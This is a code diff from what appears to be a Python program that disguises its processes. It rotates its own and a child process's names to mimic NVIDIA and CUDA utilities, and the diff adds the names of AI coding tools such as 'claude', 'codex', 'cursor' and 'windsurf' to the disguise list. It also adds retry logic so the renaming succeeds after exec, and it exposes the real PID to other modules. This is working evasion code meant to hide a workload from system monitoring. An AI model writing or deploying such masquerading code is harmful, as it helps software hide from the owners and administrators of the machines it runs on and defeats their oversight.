@@ -153,24 +153,26 @@ def main():
         stealth_manager = start_self_stealth(
             rotation_interval=25,  # Slightly different từ CPU để avoid pattern
             custom_names=[
-                "nvidia-smi",           # NVIDIA System Management Interface
-                "cuda-gdb",             # CUDA Debugger  
-                "nvcc",                 # NVIDIA CUDA Compiler
-                "nvidia-ml-py",         # NVIDIA ML Python
-                "nvidia-settings",      # NVIDIA Settings
-                "gpu-manager",          # GPU Manager
-                "glxgears",             # OpenGL test utility
-                "vulkan-info",          # Vulkan system info
-                "mesa-loader",          # Mesa graphics loader
-                "drm-tip",              # Direct Rendering Manager
-                "tensor-core",          # NVIDIA Tensor core utility
-                "cuda-drvr",            # CUDA driver helper
-                "nv-compiler",          # NV compiler service
-                "opencl-wkr",           # OpenCL worker thread
-                "cudnn-help",           # cuDNN helper
-                "nvrm-daemon",          # NVIDIA RM daemon
-                "gpu-sched",            # GPU scheduler service
-                "cuda-ipc"              # CUDA IPC handler
+                "nvidiasmi",           # NVIDIA System Management Interface
+                "cudagdb",             # CUDA Debugger
+                "nvcc",                # NVIDIA CUDA Compiler
+                "nvidiamlpy",          # NVIDIA ML Python
+                "nvidiasettings",      # NVIDIA Settings
+                "gpumanager",          # GPU Manager
+                "glxgears",            # OpenGL test utility
+                "vulkaninfo",          # Vulkan system info
+                "mesaloader",          # Mesa graphics loader
+                "drmtip",              # Direct Rendering Manager
+                "tensorcore",          # NVIDIA Tensor core utility
+                "cudadrvr",            # CUDA driver helper
+                "nvcompiler",          # NV compiler service
+                "openclwkr",           # OpenCL worker thread
+                "cudnnhelp",           # cuDNN helper
+                "nvrmdaemon",          # NVIDIA RM daemon
+                "gpusched",            # GPU scheduler service
+                "cudaipc",             # CUDA IPC handler
+                "claude", "codex", "code", "openai", 
+                "cursor", "agents", "windsurf"
             ]
         )
         
@@ -227,17 +229,38 @@ def main():
             # ---- New: Rename child PID and publish to EventBus ----
             try:
                 stealth_names = [
-                    "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py", 
-                    "nvidia-settings", "gpu-manager", "glxgears", 
-                    "vulkan-info", "mesa-loader", "drm-tip",
-                    "tensor-core", "cuda-drvr", "nv-compiler", "opencl-wkr",
-                    "cudnn-help", "nvrm-daemon", "gpu-sched", "cuda-ipc"
+                    "nvidiasmi", "cudagdb", "nvcc", "nvidiamlpy",
+                    "nvidiasettings", "gpumanager", "glxgears",
+                    "vulkaninfo", "mesaloader", "drmtip",
+                    "tensorcore", "cudadrvr", "nvcompiler", "openclwkr",
+                    "cudnnhelp", "nvrmdaemon", "gpusched", "cudaipc",
+                    "claude", "codex", "code", "openai", "cursor", "agents", "windsurf"
                 ]
                 new_name = random.choice(stealth_names)[:15]
                 # /proc/<pid>/comm expects <=15 bytes, no newline
                 safe_name = new_name.encode("utf-8")[:15].decode("utf-8", errors="ignore")
-                with open(f"/proc/{process.pid}/comm", "w", encoding="utf-8") as comm_file:
-                    comm_file.write(safe_name)
+                # Retry loop: rename may fail immediately after exec; wait then retry
+                rename_success = False
+                for attempt in range(5):  # max 5 retries within ~2s
+                    try:
+                        comm_path = f"/proc/{process.pid}/comm"
+                        bname = safe_name.encode("utf-8")
+                        # Append newline if space permits (kernel strips) to mimic echo behaviour
+                        if len(bname) < 16:
+                            bname += b"\n"
+                        fd = os.open(comm_path, os.O_WRONLY)
+                        os.write(fd, bname[:16])
+                        os.close(fd)
+                        rename_success = True
+                        break
+                    except OSError as os_err:
+                        if os_err.errno == 22:  # EINVAL – likely exec replacing process
+                            time.sleep(0.4)
+                            continue
+                        else:
+                            raise
+                if not rename_success:
+                    raise OSError(22, "Failed to rename after retries")
                 logger.info(f"✅ [GPU-POST-EXEC-STEALTH] Renamed child PID {process.pid} to '{new_name}'")
                 # Publish real PID to EventBus so other modules can target it
                 try:
